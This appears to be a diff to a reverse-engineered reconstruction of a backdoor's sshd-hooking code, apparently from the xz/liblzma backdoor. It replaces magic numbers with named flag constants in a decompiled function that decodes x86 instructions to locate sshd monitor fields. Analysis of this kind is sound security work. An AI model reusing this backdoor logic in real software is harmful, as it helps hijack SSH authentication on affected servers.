@@ -42,24 +42,24 @@ BOOL sshd_find_monitor_field_slot_via_mm_request_send
       monitor_field_addr = (u8 *)(ulong)decode_ok;
       if (decode_ok == FALSE) break;
       monitor_field_addr = (u8 *)0x0;
-      if (((insn_ctx.prefix.flags_u32 & 0x100) != 0) &&
+      if (((insn_ctx.prefix.flags_u32 & DF16_MEM_DISP) != 0) &&
          (monitor_field_addr = (u8 *)insn_ctx.mem_disp,
          ((uint)insn_ctx.prefix.decoded.modrm & XZ_MODRM_RIPREL_DISP32_MASK) == XZ_MODRM_RIPREL_DISP32)) {
         monitor_field_addr = insn_ctx.instruction + insn_ctx.mem_disp + insn_ctx.instruction_size;
       }
       tracked_reg = 0;
-      if ((insn_ctx.prefix.flags_u32 & 0x1040) != 0) {
-        if ((insn_ctx.prefix.flags_u32 & 0x40) == 0) {
+      if ((insn_ctx.prefix.flags_u32 & DF16_MODRM_IMM64_MASK) != 0) {
+        if ((insn_ctx.prefix.flags_u32 & DF16_MODRM) == 0) {
           tracked_reg = insn_ctx.prefix.decoded.flags2 & DF2_IMM64;
-          if (((insn_ctx.prefix.flags_u32 & 0x1000) != 0) &&
-             (tracked_reg = insn_ctx.mov_imm_reg_index, (insn_ctx.prefix.flags_u32 & 0x20) != 0)) {
+          if (((insn_ctx.prefix.flags_u32 & DF16_IMM64) != 0) &&
+             (tracked_reg = insn_ctx.mov_imm_reg_index, (insn_ctx.prefix.flags_u32 & DF16_REX) != 0)) {
             rex_extension = (insn_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3;
             goto LAB_001030d4;
           }
         }
         else {
           tracked_reg = insn_ctx.prefix.modrm_bytes.modrm_reg;
-          if ((insn_ctx.prefix.flags_u32 & 0x20) != 0) {
+          if ((insn_ctx.prefix.flags_u32 & DF16_REX) != 0) {
             rex_extension = (insn_ctx.prefix.modrm_bytes.rex_byte & REX_R) << 1;
 LAB_001030d4:
             tracked_reg = tracked_reg | rex_extension & 8;
@@ -87,35 +87,35 @@ LAB_00103110:
             mov_search_cursor = insn_ctx.instruction + insn_ctx.instruction_size;
             if (insn_ctx.opcode_window.opcode_window_dword == X86_OPCODE_1B_MOV_STORE) {
               rex_extension = insn_ctx.prefix.modrm_bytes.modrm_rm;
-              if ((insn_ctx.prefix.flags_u32 & 0x1040) == 0) {
-                if ((insn_ctx.prefix.flags_u32 & 0x40) != 0) goto LAB_00103237;
+              if ((insn_ctx.prefix.flags_u32 & DF16_MODRM_IMM64_MASK) == 0) {
+                if ((insn_ctx.prefix.flags_u32 & DF16_MODRM) != 0) goto LAB_00103237;
               }
-              else if ((insn_ctx.prefix.flags_u32 & 0x40) == 0) {
+              else if ((insn_ctx.prefix.flags_u32 & DF16_MODRM) == 0) {
                 candidate_reg = insn_ctx.prefix.decoded.flags2 & DF2_IMM64;
-                if (((insn_ctx.prefix.flags_u32 & 0x1000) != 0) &&
-                   (candidate_reg = insn_ctx.mov_imm_reg_index, (insn_ctx.prefix.flags_u32 & 0x20) != 0)) {
+                if (((insn_ctx.prefix.flags_u32 & DF16_IMM64) != 0) &&
+                   (candidate_reg = insn_ctx.mov_imm_reg_index, (insn_ctx.prefix.flags_u32 & DF16_REX) != 0)) {
                   candidate_reg = insn_ctx.mov_imm_reg_index |
                           ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3);
                 }
               }
               else {
                 candidate_reg = insn_ctx.prefix.modrm_bytes.modrm_reg;
-                if ((insn_ctx.prefix.flags_u32 & 0x20) != 0) {
+                if ((insn_ctx.prefix.flags_u32 & DF16_REX) != 0) {
                   candidate_reg = insn_ctx.prefix.modrm_bytes.modrm_reg |
                           ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_R) << 1);
                 }
 LAB_00103237:
                 mirrored_reg = rex_extension;
-                if ((insn_ctx.prefix.flags_u32 & 0x20) != 0) {
+                if ((insn_ctx.prefix.flags_u32 & DF16_REX) != 0) {
                   mirrored_reg = rex_extension | ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3);
                 }
               }
             }
             else if (insn_ctx.opcode_window.opcode_window_dword == X86_OPCODE_1B_MOV_LOAD) {
-              if ((insn_ctx.prefix.flags_u32 & 0x40) == 0) {
-                if ((insn_ctx.prefix.flags_u32 & 0x1040) != 0) {
+              if ((insn_ctx.prefix.flags_u32 & DF16_MODRM) == 0) {
+                if ((insn_ctx.prefix.flags_u32 & DF16_MODRM_IMM64_MASK) != 0) {
                   rex_extension = insn_ctx.mov_imm_reg_index;
-                  if ((insn_ctx.prefix.flags_u32 & 0x1000) != 0) goto LAB_00103237;
+                  if ((insn_ctx.prefix.flags_u32 & DF16_IMM64) != 0) goto LAB_00103237;
                   mirrored_reg = insn_ctx.prefix.decoded.flags2 & DF2_IMM64;
                   if (tracked_reg != candidate_reg) goto LAB_0010325f;
                   mirrored_reg = 0;
@@ -123,16 +123,16 @@ LAB_00103237:
                   goto LAB_00103110;
                 }
               }
-              else if ((insn_ctx.prefix.flags_u32 & 0x20) == 0) {
+              else if ((insn_ctx.prefix.flags_u32 & DF16_REX) == 0) {
                 candidate_reg = insn_ctx.prefix.modrm_bytes.modrm_rm;
-                if ((insn_ctx.prefix.flags_u32 & 0x1040) != 0) {
+                if ((insn_ctx.prefix.flags_u32 & DF16_MODRM_IMM64_MASK) != 0) {
                   mirrored_reg = insn_ctx.prefix.modrm_bytes.modrm_reg;
                 }
               }
               else {
                 candidate_reg = insn_ctx.prefix.modrm_bytes.modrm_rm |
                         ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3);
-                if ((insn_ctx.prefix.flags_u32 & 0x1040) != 0) {
+                if ((insn_ctx.prefix.flags_u32 & DF16_MODRM_IMM64_MASK) != 0) {
                   mirrored_reg = ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_R) << 1) |
                           insn_ctx.prefix.modrm_bytes.modrm_reg;
                 }
